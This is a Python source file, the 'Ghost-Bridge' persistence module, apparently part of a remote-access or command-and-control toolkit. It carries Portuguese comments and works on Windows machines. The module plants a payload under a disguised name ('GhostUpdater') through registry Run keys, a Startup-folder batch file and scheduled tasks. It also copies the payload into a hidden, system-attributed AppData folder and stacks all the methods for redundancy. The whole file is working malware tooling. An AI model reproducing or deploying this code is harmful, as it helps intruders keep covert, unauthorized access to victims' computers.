"""
Ghost-Bridge - Persistence Module
Múltiplos métodos de persistência para Windows.
"""
import os
import sys
import shutil
import ctypes
from datetime import datetime

try:
    import winreg
    WINREG_AVAILABLE = True
except ImportError:
    WINREG_AVAILABLE = False


class PersistenceManager:
    """
    Gerencia múltiplos métodos de persistência.
    
    Métodos implementados:
    1. Registry Run Key (HKCU)
    2. Registry Run Key (HKLM - requer admin)
    3. Startup Folder
    4. Scheduled Task
    5. WMI Event Subscription
    """
    
    def __init__(self, payload_path=None, payload_name="GhostUpdater"):
        """
        Args:
            payload_path: Caminho do executável/script
            payload_name: Nome para disfarce
        """
        if payload_path:
            self.payload_path = payload_path
        elif getattr(sys, 'frozen', False):
            self.payload_path = sys.executable
        else:
            self.payload_path = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
        
        self.payload_name = payload_name
    
    def _is_admin(self):
        """Verifica se está rodando como admin."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    # ==========================================
    # MÉTODO 1: Registry Run Key (HKCU)
    # ==========================================
    def install_registry_hkcu(self):
        """
        Adiciona ao Run do usuário atual.
        Sobrevive reboot, executa no login do usuário.
        """
        if not WINREG_AVAILABLE:
            return {'error': 'winreg não disponível'}
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, self.payload_name, 0, winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            
            return {
                'method': 'registry_hkcu',
                'status': 'success',
                'key': f'HKCU\\{key_path}\\{self.payload_name}',
                'value': self.payload_path
            }
            
        except Exception as e:
            return {'method': 'registry_hkcu', 'status': 'failed', 'error': str(e)}
    
    def remove_registry_hkcu(self):
        """Remove persistência do registro HKCU."""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, self.payload_name)
            winreg.CloseKey(key)
            return {'status': 'removed'}
        except:
            return {'status': 'not_found'}
    
    # ==========================================
    # MÉTODO 2: Registry Run Key (HKLM)
    # ==========================================
    def install_registry_hklm(self):
        """
        Adiciona ao Run da máquina (requer admin).
        Executa para TODOS os usuários.
        """
        if not self._is_admin():
            return {'error': 'Requer privilégios de administrador'}
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, self.payload_name, 0, winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            
            return {
                'method': 'registry_hklm',
                'status': 'success',
                'key': f'HKLM\\{key_path}\\{self.payload_name}'
            }
            
        except Exception as e:
            return {'method': 'registry_hklm', 'status': 'failed', 'error': str(e)}
    
    # ==========================================
    # MÉTODO 3: Startup Folder
    # ==========================================
    def install_startup_folder(self):
        """
        Cria atalho na pasta Startup.
        Menos suspeito que registro.
        """
        try:
            startup_path = os.path.join(
                os.environ.get('APPDATA', ''),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            
            # Cria arquivo .bat como atalho simples
            bat_path = os.path.join(startup_path, f"{self.payload_name}.bat")
            
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\n')
                f.write(f'start "" {self.payload_path}\n')
            
            return {
                'method': 'startup_folder',
                'status': 'success',
                'path': bat_path
            }
            
        except Exception as e:
            return {'method': 'startup_folder', 'status': 'failed', 'error': str(e)}
    
    def remove_startup_folder(self):
        """Remove do Startup folder."""
        try:
            startup_path = os.path.join(
                os.environ.get('APPDATA', ''),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            
            for ext in ['.bat', '.vbs', '.lnk']:
                path = os.path.join(startup_path, f"{self.payload_name}{ext}")
                if os.path.exists(path):
                    os.remove(path)
            
            return {'status': 'removed'}
        except:
            return {'status': 'failed'}
    
    # ==========================================
    # MÉTODO 4: Scheduled Task
    # ==========================================
    def install_scheduled_task(self, trigger='logon'):
        """
        Cria tarefa agendada.
        
        Args:
            trigger: 'logon', 'startup', 'daily', 'hourly'
        """
        import subprocess
        
        # Configuração do trigger
        triggers = {
            'logon': '/sc ONLOGON',
            'startup': '/sc ONSTART',
            'daily': '/sc DAILY /st 09:00',
            'hourly': '/sc HOURLY'
        }
        
        trigger_arg = triggers.get(trigger, '/sc ONLOGON')
        
        # Comando para criar tarefa
        cmd = f'schtasks /create /tn "{self.payload_name}" {trigger_arg} /tr "{self.payload_path}" /f'
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return {
                    'method': 'scheduled_task',
                    'status': 'success',
                    'task_name': self.payload_name,
                    'trigger': trigger
                }
            else:
                return {
                    'method': 'scheduled_task',
                    'status': 'failed',
                    'error': result.stderr
                }
                
        except Exception as e:
            return {'method': 'scheduled_task', 'status': 'failed', 'error': str(e)}
    
    def remove_scheduled_task(self):
        """Remove tarefa agendada."""
        import subprocess
        
        cmd = f'schtasks /delete /tn "{self.payload_name}" /f'
        
        try:
            subprocess.run(cmd, shell=True, capture_output=True)
            return {'status': 'removed'}
        except:
            return {'status': 'failed'}
    
    # ==========================================
    # MÉTODO 5: Cópia para Local Persistente
    # ==========================================
    def copy_to_hidden_location(self):
        """
        Copia o payload para um local oculto.
        Útil quando o arquivo original pode ser deletado.
        """
        try:
            # Diretório oculto no AppData
            hidden_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                '.ghost_cache'
            )
            
            os.makedirs(hidden_dir, exist_ok=True)
            
            # Se é um executável compilado
            if getattr(sys, 'frozen', False):
                dest = os.path.join(hidden_dir, f"{self.payload_name}.exe")
                shutil.copy2(sys.executable, dest)
            else:
                # Copia o script atual
                dest = os.path.join(hidden_dir, f"{self.payload_name}.pyw")
                shutil.copy2(sys.argv[0], dest)
            
            # Marca como oculto (Windows)
            import subprocess
            subprocess.run(f'attrib +h +s "{hidden_dir}"', shell=True, capture_output=True)
            
            # Atualiza payload path
            self.payload_path = dest
            
            return {
                'status': 'success',
                'hidden_path': dest
            }
            
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}
    
    # ==========================================
    # MÉTODO COMPLETO
    # ==========================================
    def install_all(self):
        """
        Instala múltiplos métodos de persistência.
        Redundância aumenta chance de sobrevivência.
        """
        results = []
        
        # 1. Copia para local oculto primeiro
        copy_result = self.copy_to_hidden_location()
        results.append(copy_result)
        
        # 2. Registry HKCU (sempre funciona)
        results.append(self.install_registry_hkcu())
        
        # 3. Startup folder (backup)
        results.append(self.install_startup_folder())
        
        # 4. Scheduled task (mais robusto)
        results.append(self.install_scheduled_task('logon'))
        
        # 5. Registry HKLM (se admin)
        if self._is_admin():
            results.append(self.install_registry_hklm())
        
        return {
            'timestamp': datetime.now().isoformat(),
            'is_admin': self._is_admin(),
            'methods': results
        }
    
    def remove_all(self):
        """Remove todas as persistências."""
        results = []
        
        results.append(self.remove_registry_hkcu())
        results.append(self.remove_startup_folder())
        results.append(self.remove_scheduled_task())
        
        return {'removed': results}
    
    def check_persistence(self):
        """Verifica quais métodos estão ativos."""
        active = []
        
        # Verifica registry HKCU
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, self.payload_name)
            active.append('registry_hkcu')
            winreg.CloseKey(key)
        except:
            pass
        
        # Verifica startup folder
        startup_path = os.path.join(
            os.environ.get('APPDATA', ''),
            r'Microsoft\Windows\Start Menu\Programs\Startup',
            f"{self.payload_name}.bat"
        )
        if os.path.exists(startup_path):
            active.append('startup_folder')
        
        # Verifica scheduled task
        import subprocess
        result = subprocess.run(
            f'schtasks /query /tn "{self.payload_name}"',
            shell=True, capture_output=True
        )
        if result.returncode == 0:
            active.append('scheduled_task')
        
        return {
            'active_methods': active,
            'count': len(active)
        }


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste do Persistence Manager")
    
    pm = PersistenceManager()
    
    print(f"[+] Is Admin: {pm._is_admin()}")
    print(f"[+] Payload: {pm.payload_path}")
    
    print("\n[+] Verificando persistência atual:")
    status = pm.check_persistence()
    print(f"    Métodos ativos: {status['active_methods']}")
    
    print("\n[!] Para instalar, use: pm.install_all()")
    print("[!] Para remover, use: pm.remove_all()")
